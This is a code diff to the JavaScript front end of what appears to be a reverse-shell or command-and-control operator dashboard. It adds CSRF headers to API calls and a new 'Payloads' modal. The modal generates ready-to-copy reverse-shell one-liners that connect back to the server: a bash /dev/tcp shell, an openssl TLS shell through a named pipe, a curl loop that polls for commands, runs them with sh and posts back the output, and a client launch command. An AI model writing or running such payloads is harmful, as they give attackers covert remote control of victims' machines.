@@ -56,9 +56,15 @@ const app = state({
   badUsbCopied: false,
   logEntries: [],
   logWs: null,
+  payloadsOpen: false,
 });
 
 const current = () => app.sessions.find((s) => s.id === app.currentId) || null;
+
+function csrfToken() {
+  const m = document.cookie.match(/(?:^|; )rsl_csrf=([^;]+)/);
+  return m ? decodeURIComponent(m[1]) : "";
+}
 
 const hostMatches = (h) => {
   const q = app.search.trim().toLowerCase();
@@ -126,6 +132,13 @@ function openModal(name) {
 
 function closeModal() {
   app.modal = null;
+}
+
+function openPayloads() {
+  app.payloadsOpen = true;
+}
+function closePayloads() {
+  app.payloadsOpen = false;
 }
 
 function paletteRunSelected() {
@@ -287,11 +300,17 @@ function selectSession(id) {
 async function killCurrent() {
   const c = current();
   if (!c) return;
-  await fetch(`/api/sessions/${c.id}/kill`, { method: "POST" }).catch(() => {});
+  await fetch(`/api/sessions/${c.id}/kill`, {
+    method: "POST",
+    headers: { "X-CSRF-Token": csrfToken() },
+  }).catch(() => {});
 }
 
 async function clearDeadSessions() {
-  await fetch("/api/sessions/clear-dead", { method: "POST" }).catch(() => {});
+  await fetch("/api/sessions/clear-dead", {
+    method: "POST",
+    headers: { "X-CSRF-Token": csrfToken() },
+  }).catch(() => {});
 }
 
 function upgradeCurrent() {
@@ -313,7 +332,7 @@ async function openHostShell(hostId) {
   const rows = termCtl.term?.rows || 24;
   await fetch(`/api/hosts/${hostId}/shells`, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrfToken() },
     body: JSON.stringify({ cols, rows }),
   }).catch(() => {});
 }
@@ -799,6 +818,46 @@ const BadUsbModal = () =>
       })
   );
 
+const PayloadsModal = () =>
+  when(
+    () => app.payloadsOpen,
+    () => {
+      const host = location.host;
+      const hostname = location.hostname;
+      const httpProto = location.protocol === "https:" ? "https" : "http";
+      const wsProto = location.protocol === "https:" ? "wss" : "ws";
+      const token = app.buildToken || "YOUR_BUILD_TOKEN";
+      const tcpPayload = `bash -i >& /dev/tcp/${hostname}/1337 0>&1`;
+      const tlsPayload = `mkfifo /tmp/f; /bin/sh -i </tmp/f 2>&1 | openssl s_client -quiet -connect ${hostname}:1338 >/tmp/f`;
+      const webPayload = `H=${httpProto}://${host}; T=${token}\nID=$(curl -s "$H/webshell/register?token=$T")\nwhile :; do\n  C=$(curl -s -H "X-RSL-Token: $T" "$H/webshell/$ID/poll")\n  [ -n "$C" ] && O=$(printf '%s' "$C" | sh 2>&1)\n  curl -s -H "X-RSL-Token: $T" --data-binary "$O" "$H/webshell/$ID/output"\ndone`;
+      const muxPayload = `RSL_SERVER=${wsProto}://${host}/mux RSL_TOKEN=${token} ./rsl-client`;
+      const copy = (text) =>
+        navigator.clipboard.writeText(text).catch(() => {});
+      const block = (title, text) =>
+        el(
+          "div",
+          { class: "payload-block" },
+          el("div", { class: "list-group-label" }, el("span", {}, title)),
+          el("pre", { class: "payload-script" }, text),
+          el(
+            "button",
+            { class: "btn micro", onclick: () => copy(text) },
+            "Copy"
+          )
+        );
+      return ModalShell({
+        title: "Payloads",
+        onClose: closePayloads,
+        children: [
+          block("Raw TCP", tcpPayload),
+          block("TLS", tlsPayload),
+          block("HTTP webshell", webPayload),
+          block("Mux / Go client", muxPayload),
+        ],
+      });
+    }
+  );
+
 const HostDetails = () =>
   when(
     () => app.hostDetailsId !== null,
@@ -1135,6 +1194,14 @@ const Sidebar = () =>
           onclick: () => openModal("badusb"),
         },
         "BadUSB"
+      ),
+      el(
+        "button",
+        {
+          class: "btn",
+          onclick: openPayloads,
+        },
+        "Payloads"
       )
     )
   );
@@ -1260,7 +1327,7 @@ const SidebarBackdrop = () =>
 
 // --- Boot ------------------------------------------------------------------
 mount(document.getElementById("app"), () =>
-  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails(), CommandPalette(), BuildModal(), BadUsbModal())
+  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails(), CommandPalette(), BuildModal(), BadUsbModal(), PayloadsModal())
 );
 
 connectSessionsStream();
